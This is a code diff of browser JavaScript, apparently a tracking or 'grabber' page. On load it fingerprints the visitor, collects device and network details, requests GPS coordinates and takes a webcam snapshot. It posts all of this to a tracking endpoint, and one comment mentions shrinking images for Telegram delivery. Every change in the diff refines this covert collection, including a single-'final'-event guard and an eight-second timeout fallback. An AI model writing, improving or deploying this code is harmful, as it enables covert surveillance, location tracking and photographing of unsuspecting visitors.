@@ -1,6 +1,8 @@
 const API = "/api/track";
 
+// ==============================
 // USER + SESSION
+// ==============================
 function getUserId() {
   let id = localStorage.getItem("user_id");
   if (!id) {
@@ -13,7 +15,9 @@ function getUserId() {
 const USER_ID = getUserId();
 const SESSION_ID = crypto.randomUUID();
 
-// SIMPLE FINGERPRINT
+// ==============================
+// FINGERPRINT
+// ==============================
 function getFingerprint() {
   return btoa(
     navigator.userAgent +
@@ -26,48 +30,80 @@ function getFingerprint() {
 
 const FP = getFingerprint();
 
-// SEND
+// ==============================
+// SEND FUNCTION
+// ==============================
 function send(data) {
   fetch(API, {
     method: "POST",
-    headers: {"Content-Type": "application/json"},
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       user_id: USER_ID,
       session_id: SESSION_ID,
       fingerprint: FP,
       ...data
     })
-  });
+  }).catch(err => console.log("Send error:", err));
 }
 
-// INIT
+// ==============================
+// INIT DATA (FIXED FIELD NAMES)
+// ==============================
 send({
   event: "init",
-  userAgent: navigator.userAgent,
-  platform: navigator.platform,
-  screen: screen.width + "x" + screen.height,
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+  device: navigator.userAgent,
+  os: navigator.platform,
+  browser: navigator.appName,
+  screen: `${screen.width}x${screen.height}`,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  time: new Date().toISOString()
 });
 
-// NETWORK
+// ==============================
+// NETWORK INFO (FIXED FIELD)
+// ==============================
 const net = navigator.connection || {};
 send({
   event: "network",
-  effectiveType: net.effectiveType,
-  downlink: net.downlink
+  network: net.effectiveType || "unknown",
+  downlink: net.downlink || "-"
 });
 
-// GPS
+// ==============================
+// GPS LOCATION
+// ==============================
 navigator.geolocation.getCurrentPosition(
-  pos => send({
-    event: "gps",
-    lat: pos.coords.latitude,
-    lng: pos.coords.longitude
-  }),
-  () => send({ event: "gps_denied" })
+  pos => {
+    send({
+      event: "gps",
+      lat: pos.coords.latitude,
+      lng: pos.coords.longitude
+    });
+  },
+  () => {
+    send({ event: "gps_denied" });
+  }
 );
 
-// CAMERA + FINAL
+// ==============================
+// FINAL EVENT CONTROL (IMPORTANT)
+// ==============================
+let finalSent = false;
+
+function sendFinal(data) {
+  if (finalSent) return;
+  finalSent = true;
+
+  send({
+    event: "final",
+    time: new Date().toISOString(),
+    ...data
+  });
+}
+
+// ==============================
+// CAMERA CAPTURE (OPTIMIZED)
+// ==============================
 async function camera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -77,32 +113,41 @@ async function camera() {
     await video.play();
 
     const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
 
-    canvas.getContext("2d").drawImage(video, 0, 0);
+    // ✅ Reduce size for Telegram reliability
+    canvas.width = 320;
+    canvas.height = 240;
+
+    canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
 
     const image = canvas.toDataURL("image/jpeg", 0.5);
 
-    send({
-      event: "final",
+    sendFinal({
       image,
       camera: "captured"
     });
 
     stream.getTracks().forEach(t => t.stop());
 
-  } catch {
-    send({
-      event: "final",
+  } catch (err) {
+    console.log("Camera error:", err);
+
+    sendFinal({
       camera: "denied"
     });
   }
 }
 
+// ==============================
+// RUN CAMERA
+// ==============================
 camera();
 
-// fallback
+// ==============================
+// FALLBACK (ONLY IF CAMERA FAILS)
+// ==============================
 setTimeout(() => {
-  send({ event: "final", camera: "timeout" });
+  sendFinal({
+    camera: "timeout"
+  });
 }, 8000);
